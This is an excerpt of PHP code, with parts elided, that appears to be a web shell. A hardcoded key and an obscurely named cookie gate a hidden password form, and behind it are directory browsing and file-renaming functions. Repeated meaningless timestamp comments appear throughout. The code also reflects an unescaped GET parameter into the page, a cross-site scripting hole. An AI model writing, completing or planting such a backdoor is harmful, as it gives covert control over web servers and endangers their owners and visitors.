...
$auth_key = "2e371b547b9fff08fe349e41ba981e90";
...
$pass = false;
if (isset($_COOKIE['pw_name_76029'])) {
    if(($_COOKIE['pw_name_76029']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_76029'])) {
        if(($_POST['pw_name_76029']) == $auth_key) {
            setcookie("pw_name_76029", $_POST['pw_name_76029']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_76029' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1745918033748095 1745918033698737 1745918033716160 1745918033900576
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1745918033748095 1745918033698737 1745918033716160 1745918033900576
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1745918033748095 1745918033698737 1745918033716160 1745918033900576
            $name = PATH . "/" . $_GET['r'];
